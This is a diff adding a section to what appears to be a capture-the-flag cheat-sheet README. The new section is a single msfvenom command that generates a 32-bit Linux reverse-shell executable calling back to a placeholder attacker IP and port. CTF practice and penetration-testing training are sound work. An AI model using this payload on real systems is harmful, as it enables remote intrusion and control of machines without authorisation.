@@ -110,6 +110,13 @@ A collection of tool commands and scripts for capture the flag machines
   reset
   ```
   
+  # MSVENOM (Payload Generator and Encoder)
+  
+  Create 32-bit reverse shell for Linux 
+  
+  ```bash
+  msfvenom -p linux/x86/shell_reverse_tcp LHOST=[LHOST_IP] LPORT=[LHOST_PORT] -f elf -o rev
+  ```
   
   
   
